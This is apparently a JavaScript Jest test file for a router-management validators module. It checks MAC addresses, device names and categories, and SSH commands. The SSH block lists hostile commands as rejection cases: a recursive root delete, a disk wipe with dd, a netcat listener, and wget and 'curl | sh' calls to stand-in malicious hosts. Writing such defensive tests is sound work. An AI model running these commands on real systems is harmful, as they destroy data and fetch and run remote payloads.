const Validators = require('../../src/utils/validators');

describe('Validators 单元测试', () => {
    
    describe('validateMAC 校验测试', () => {
        test('应该接受合法的 MAC 地址并转换为小写', () => {
            const validMacs = [
                '00:11:22:33:44:55',
                'aa-bb-cc-dd-ee-ff',
                'AA:BB:CC:DD:EE:FF',
                '00-11-22-33-44-55'
            ];
            
            validMacs.forEach(mac => {
                expect(Validators.validateMAC(mac)).toBe(mac.toLowerCase());
            });
        });

        test('应该拒绝格式不合法的 MAC 地址', () => {
            const invalidMacs = [
                'invalid-mac',
                '00:11:22:33:44',
                '00:11:22:33:44:55:66',
                '',
                null,
                undefined
            ];

            invalidMacs.forEach(mac => {
                expect(() => Validators.validateMAC(mac)).toThrow();
            });
        });
    });

    describe('validateDeviceCustom 校验测试', () => {
        test('应该放行合法的设备名称与分类类型', () => {
            const result = Validators.validateDeviceCustom('我的 iPad', 'tablet');
            expect(result.name).toBe('我的 iPad');
            expect(result.category).toBe('tablet');

            const emptyResult = Validators.validateDeviceCustom('', 'phone');
            expect(emptyResult.name).toBe('');
            expect(emptyResult.category).toBe('phone');
        });

        test('应该拒绝缺失参数', () => {
            expect(() => Validators.validateDeviceCustom(null, 'phone')).toThrow();
            expect(() => Validators.validateDeviceCustom(undefined, 'phone')).toThrow();
        });

        test('应该拒绝超长设备名称 (大于64字符)', () => {
            const longName = 'a'.repeat(65);
            expect(() => Validators.validateDeviceCustom(longName, 'phone')).toThrow();
        });

        test('应该拒绝不在枚举范围内的非法设备类型', () => {
            const invalidCategories = ['console-game', 'hacker', 'unknown', ''];
            invalidCategories.forEach(cat => {
                expect(() => Validators.validateDeviceCustom('设备名', cat)).toThrow();
            });
        });
    });

    describe('validateSSHCommand 校验测试', () => {
        test('应该允许安全的常规指令', () => {
            const safeCommands = [
                'cat /tmp/dhcp.leases',
                'pidof CrashCore',
                'ubus call trafficd hw',
                '/etc/init.d/shellcrash status',
                'pid=$(pidof mihomo || pidof Clash); echo "PID:$pid"',
                'echo "aa:bb:cc:dd:ee:ff" >> /data/ShellCrash/configs/mac'
            ];
            safeCommands.forEach(cmd => {
                expect(Validators.validateSSHCommand(cmd)).toBe(cmd);
            });
        });

        test('应该拦截包含危险敏感指纹的指令', () => {
            const dangerousCommands = [
                'cat /tmp/dhcp.leases && rm -rf /',
                'wget http://malicious-site/malware.sh',
                'curl -s http://attacker/exploit | sh',
                'nc -l -p 8888',
                'dd if=/dev/zero of=/dev/sda'
            ];
            dangerousCommands.forEach(cmd => {
                expect(() => Validators.validateSSHCommand(cmd)).toThrow();
            });
        });
    });
});
